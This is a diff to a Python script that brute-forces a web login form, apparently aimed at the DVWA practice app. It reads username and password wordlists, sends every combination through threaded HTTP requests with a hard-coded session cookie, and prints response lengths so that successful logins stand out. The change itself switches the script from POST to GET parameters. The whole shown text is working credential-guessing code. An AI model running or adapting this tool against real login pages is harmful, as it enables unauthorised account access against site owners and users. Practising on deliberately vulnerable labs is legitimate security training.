@@ -1,5 +1,5 @@
 import optparse
-import math 
+import math
 import pysnooper
 import threading
 import requests
@@ -18,14 +18,15 @@ ths = int(options.threads)
 pass_dic = options.passfile
 user_dic = options.namefile
 site = options.website
-
+# print (type(site))
 
 def scan(payload):
     user = payload["username"]
     threads_pass_list = payload["pass_list"]
     for password in threads_pass_list:
-        r = requests.post(url = site, data = {"username":user, "password":password.strip(), "submit":"submit"}) # 根据实际情况修改相应的参数
-        print ("username: "+user+" ; "+"password : "+password+"  "+str(len(r.text))+ "\n")
+        # r = requests.post(url = site, data = {"username":user, "password":password.strip(), "submit":"submit"}) # 根据实际情况修改相应的参数
+        r = requests.get(url = site, params = {"username":user, "password":password.strip(), "Login":"Login"}, headers = {"Cookie":"security=high; security=high; PHPSESSID=lip25ut7pltp2nkjrgd68l9fq5"})
+        print (str(len(r.text)) + "username: "+user+" ; "+"password : "+password + "\n")
 
 
 # 新建一个密码字典列表 [[],[],[]]
